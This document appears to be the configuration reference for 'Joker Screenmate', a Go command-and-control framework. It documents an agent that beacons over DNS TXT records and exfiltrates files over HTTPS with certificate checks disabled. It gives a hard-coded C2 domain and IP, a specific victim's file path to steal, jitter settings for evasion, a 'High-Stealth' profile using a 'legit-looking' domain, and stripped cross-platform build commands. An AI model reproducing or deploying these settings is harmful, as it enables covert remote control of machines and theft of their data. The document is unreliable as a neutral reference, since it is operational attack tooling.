# Joker Screenmate Configuration Reference

Complete reference for all configuration options.

## Configuration Files

| File | Purpose | Location |
|------|---------|----------|
| Server constants | Server settings | `cmd/server/main.go` |
| Agent constants | Agent settings | `cmd/agent/main.go` |
| Protocol constants | Shared protocol values | `internal/protocol/protocol.go` |

## Server Configuration

### Server Constants

Located in `cmd/server/main.go`:

```go
const (
    Domain      = "timeserversync.com"
    PayloadFile = "./payloads/payload.jpg"
    CertDir     = "./certs"
    DNSPort     = 53
    HTTPSPort   = 8443
    TriggerPort = 9090
    ExfilDir    = "./exfiltrated"
)
```

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `Domain` | string | `timeserversync.com` | C2 domain name (with or without trailing dot) |
| `PayloadFile` | string | `./payloads/payload.jpg` | Default payload file path |
| `CertDir` | string | `./certs` | Directory for TLS certificates |
| `DNSPort` | int | `53` | UDP port for DNS server |
| `HTTPSPort` | int | `8443` | TCP port for HTTPS server |
| `TriggerPort` | int | `9090` | TCP port for trigger API (localhost only) |
| `ExfilDir` | string | `./exfiltrated` | Directory to save exfiltrated files |

### DNS Server Options

Located in `internal/dns/server.go`:

```go
type Server struct {
    domain        string
    port          int
    mu            sync.RWMutex
    jobPending    bool
    payloadChunks []string
    currentChunk  int
    transferDone  bool
}
```

### HTTPS Server Options

Located in `internal/https/server.go`:

```go
type Server struct {
    port      int
    certDir   string
    outputDir string
}
```

**Certificate Generation:**
- Key type: RSA 2048-bit
- Certificate validity: 1 year
- Common Name: "localhost"
- Auto-generated if missing

## Agent Configuration

### Agent Constants

Located in `cmd/agent/main.go`:

```go
const (
    Domain           = "timeserversync.com"
    C2ServerIP       = "48.217.188.16"
    DirectMode       = false
    DNSResolver      = "192.168.2.1:53"
    BeaconInterval   = 300
    Jitter           = 120
    HTTPSPort        = 8443
    ExfilFilePath    = `C:\Users\tresa\OneDrive\Desktop\employees_dir.zip`
    TXTQueryDelayMs  = 1500
)
```

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `Domain` | string | `timeserversync.com` | C2 domain name |
| `C2ServerIP` | string | `48.217.188.16` | C2 server IP address |
| `DirectMode` | bool | `false` | A queries direct to C2 vs via resolver |
| `DNSResolver` | string | `192.168.2.1:53` | Local DNS resolver for A queries |
| `BeaconInterval` | int | `300` | Base beacon interval in seconds |
| `Jitter` | int | `120` | Random jitter range (±seconds) |
| `HTTPSPort` | int | `8443` | HTTPS exfiltration port |
| `ExfilFilePath` | string | Target-specific | File to exfiltrate |
| `TXTQueryDelayMs` | int | `1500` | Delay between TXT queries in ms |

### Routing Modes

**DirectMode = false (Default):**
```
A Queries:   Agent → DNSResolver → Internet → C2
TXT Queries: Agent → C2 Direct (always)
HTTPS:       Agent → C2 Direct (always)
```

**DirectMode = true:**
```
A Queries:   Agent → C2 Direct
TXT Queries: Agent → C2 Direct
HTTPS:       Agent → C2 Direct
```

### Timing Calculations

```go
// Beacon interval calculation
actualInterval := BeaconInterval + rand.Intn(Jitter*2) - Jitter

// With defaults (300 ± 120):
// Minimum: 300 - 120 = 180 seconds (3 minutes)
// Maximum: 300 + 120 = 420 seconds (7 minutes)
// Average: ~300 seconds (5 minutes)
```

### DNS Client Options

Located in `internal/dns/client.go`:

```go
type Client struct {
    aTarget   string          // Target for A queries
    txtTarget string          // Target for TXT queries (always C2)
    domain    string          // Base domain
    timeout   time.Duration   // Query timeout (5 seconds)
}
```

### HTTPS Client Options

Located in `internal/https/client.go`:

```go
type Client struct {
    serverURL  string           // https://IP:port
    httpClient *http.Client     // Configured HTTP client
}
```

**TLS Configuration:**
- Certificate verification: Disabled (InsecureSkipVerify=true)
- Timeout: None (allows large file transfers)

## Protocol Configuration

### Protocol Constants

Located in `internal/protocol/protocol.go`:

```go
const (
    Domain               = "timeserversync.com"
    TTL                  = 300
    SequenceNumberLength = 8
)

var (
    NoJobRange = net.IPNet{
        IP:   net.ParseIP("198.51.100.0"),
        Mask: net.CIDRMask(24, 32),
    }
    JobRange = net.IPNet{
        IP:   net.ParseIP("203.0.113.0"),
        Mask: net.CIDRMask(24, 32),
    }
)
```

| Option | Value | Description |
|--------|-------|-------------|
| `Domain` | `timeserversync.com` | Default C2 domain |
| `TTL` | `300` | DNS record TTL in seconds |
| `SequenceNumberLength` | `8` | Chunk sequence number digits |
| `NoJobRange` | `198.51.100.0/24` | IP range for NO_JOB status |
| `JobRange` | `203.0.113.0/24` | IP range for JOB_PENDING status |

### Subdomain List

```go
var Subdomains = []string{
    "www", "mail", "app", "docs", "api", "cdn", "assets",
    "static", "portal", "login", "auth", "secure", "support",
    "help", "status", "update", "sync", "time", "ntp", "services",
}
```

### Chunk Configuration

```go
const ChunkSize = 200  // Bytes per TXT record
```

**Chunk Format:**
```
[8-digit sequence][Base64 data]
Example: 00000042VGhpcyBpcyBhIHRlc3Q=
```

## Example Configurations

### Minimal Server Config

```go
// cmd/server/main.go
const (
    Domain      = "your-domain.com"
    PayloadFile = "./payloads/default.bin"
    DNSPort     = 53
    HTTPSPort   = 8443
    TriggerPort = 9090
    ExfilDir    = "./exfiltrated"
)
```

### Minimal Agent Config

```go
// cmd/agent/main.go
const (
    Domain         = "your-domain.com"
    C2ServerIP     = "YOUR_SERVER_IP"
    DirectMode     = false
    DNSResolver    = "8.8.8.8:53"
    BeaconInterval = 300
    Jitter         = 120
    HTTPSPort      = 8443
    ExfilFilePath  = `/path/to/target/file`
)
```

### High-Stealth Agent Config

```go
// Longer intervals, more jitter
const (
    Domain         = "legit-looking-domain.com"
    C2ServerIP     = "YOUR_SERVER_IP"
    DirectMode     = false
    DNSResolver    = "192.168.1.1:53"  // Local resolver
    BeaconInterval = 900               // 15 minutes base
    Jitter         = 600               // ±10 minutes
    HTTPSPort      = 443               // Standard HTTPS
    ExfilFilePath  = `/tmp/data.zip`
    TXTQueryDelayMs = 3000             // 3 seconds between chunks
)
```

### Lab Testing Config

```go
// Fast intervals for testing
const (
    Domain         = "test.local"
    C2ServerIP     = "192.168.1.100"
    DirectMode     = true              // Direct for testing
    BeaconInterval = 10                // 10 seconds
    Jitter         = 5                 // ±5 seconds
    HTTPSPort      = 8443
    TXTQueryDelayMs = 100              // Fast transfer
)
```

## Environment Variables

The project does not currently use environment variables. All configuration is compile-time via constants.

## Build-Time Configuration

### Cross-Compilation

```bash
# Windows agent
GOOS=windows GOARCH=amd64 go build -o agent.exe ./cmd/agent

# Linux server
GOOS=linux GOARCH=amd64 go build -o server ./cmd/server

# macOS agent
GOOS=darwin GOARCH=amd64 go build -o agent_mac ./cmd/agent
```

### Build Flags

```bash
# Strip debug info for smaller binary
go build -ldflags="-s -w" -o agent ./cmd/agent

# Static linking (no CGO)
CGO_ENABLED=0 go build -o agent ./cmd/agent
```

## Directory Structure

```
joker_screenmate/
├── cmd/
│   ├── agent/main.go     # Agent configuration
│   └── server/main.go    # Server configuration
├── internal/
│   ├── dns/
│   │   ├── server.go     # DNS server
│   │   └── client.go     # DNS client
│   ├── https/
│   │   ├── server.go     # HTTPS server
│   │   └── client.go     # HTTPS client
│   └── protocol/
│       └── protocol.go   # Shared constants
├── certs/                # Auto-generated TLS certs
├── payloads/             # Payload files
├── exfiltrated/          # Received files
└── go.mod
```

## Validation

Configuration is validated at runtime:

### Server Validation
- DNS port must be available (requires root for 53)
- Payload file must exist when triggered
- Certificate directory must be writable

### Agent Validation
- C2 server IP must be valid
- DNS resolver must be reachable
- Exfil file must exist when attempting upload

## Next Steps

- [Server Guide](server-guide.md) - Server setup
- [Agent Guide](agent-guide.md) - Agent deployment
- [Protocol](protocol.md) - Protocol specification
